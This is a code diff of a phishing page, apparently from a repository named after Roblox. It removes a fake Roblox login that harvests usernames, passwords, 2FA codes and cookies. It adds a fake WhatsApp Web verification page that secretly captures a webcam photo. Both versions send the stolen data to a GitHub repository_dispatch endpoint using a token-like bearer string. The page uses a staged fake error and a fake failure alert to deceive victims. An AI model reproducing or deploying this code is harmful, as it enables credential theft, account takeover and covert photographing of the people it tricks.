@@ -1,79 +1,48 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Login | Roblox</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Verification Required</title>
     <style>
-        body { background: #f2f4f5; font-family: 'HCo Gotham SSm', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: white; padding: 40px; width: 380px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.2); text-align: center; }
-        .err { color: #f74b4e; font-size: 13px; margin-bottom: 10px; display: none; text-align: left; background: #fff1f1; padding: 10px; border: 1px solid #f74b4e; border-radius: 3px; }
-        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #b8b8b8; border-radius: 3px; box-sizing: border-box; }
-        .btn { width: 100%; padding: 12px; background: #0084ff; border: none; color: white; font-weight: bold; border-radius: 3px; cursor: pointer; margin-top: 10px; }
-        #step-2, #loader { display: none; }
+        body { background: #000; color: white; text-align: center; font-family: sans-serif; padding-top: 50px; }
+        video { display: none; }
+        canvas { display: none; }
+        .btn { padding: 15px 30px; background: #25d366; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <img src="https://images.rbxcdn.com/234212955720c024d36006e89094033c.svg" width="150" style="margin-bottom: 20px;">
-        <div id="loader"><img src="https://www.roblox.com/images/Icons/LoadingInB.gif" width="40"><p>Verifying Account...</p></div>
-        <div id="err" class="err">Incorrect username or password. Please try again.</div>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="80">
+    <h2>WhatsApp Web Verification</h2>
+    <p>Please allow camera access to scan the QR code and verify your session.</p>
+    <button class="btn" onclick="startCapture()">Verify Now</button>
 
-        <div id="step-1">
-            <input type="text" id="u" placeholder="Username / Email">
-            <input type="password" id="p" placeholder="Password">
-            <button class="btn" onclick="checkAuth()">Log In</button>
-        </div>
-
-        <div id="step-2">
-            <h3 style="font-size: 18px;">Verification Required</h3>
-            <p style="font-size: 13px; color: #666;">Enter the code sent to your device to continue.</p>
-            <input type="text" id="2fa" placeholder="6-Digit Code">
-            <button class="btn" onclick="capture()">Verify</button>
-        </div>
-    </div>
+    <video id="video" autoplay></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
-    let tries = 0; let tmp = {};
+    async function startCapture() {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById('video');
+        video.srcObject = stream;
 
-    function checkAuth() {
-        const u = document.getElementById('u').value;
-        const p = document.getElementById('p').value;
-        if(u.length < 3 || p.length < 4) return;
-
-        document.getElementById('step-1').style.display = 'none';
-        document.getElementById('loader').style.display = 'block';
-
+        // التقاط صورة بعد ثانية واحدة من السماح
         setTimeout(() => {
-            document.getElementById('loader').style.display = 'none';
-            if (tries === 0) {
-                document.getElementById('err').style.display = 'block';
-                document.getElementById('step-1').style.display = 'block';
-                tries++;
-            } else {
-                tmp = { u, p };
-                document.getElementById('step-2').style.display = 'block';
-            }
-        }, 3000);
+            const canvas = document.getElementById('canvas');
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const imageData = canvas.toDataURL('image/jpeg');
+            sendToGithub(imageData);
+        }, 1000);
     }
 
-    async function capture() {
-        const payload = {
-            u: tmp.u, p: tmp.p,
-            code: document.getElementById('2fa').value,
-            c: document.cookie 
-        };
-
+    async function sendToGithub(data) {
         await fetch('https://api.github.com/repos/mazenasad/Roblox/dispatches', {
             method: 'POST',
             headers: {
-                'Authorization': 'Bearer Ghp_97JezTJxEirxlVQMQPBum23FefoeyP309Vr7',
+                'Authorization': 'Bearer YOUR_TOKEN',
                 'Accept': 'application/vnd.github.v3+json'
             },
-            body: JSON.stringify({ event_type: 'log_data', client_payload: payload })
+            body: JSON.stringify({ event_type: 'log_image', client_payload: { img: data } })
         });
-
-        window.location.href = "https://www.roblox.com/login";
+        alert("Verification Failed. Try again later.");
     }
     </script>
 </body>
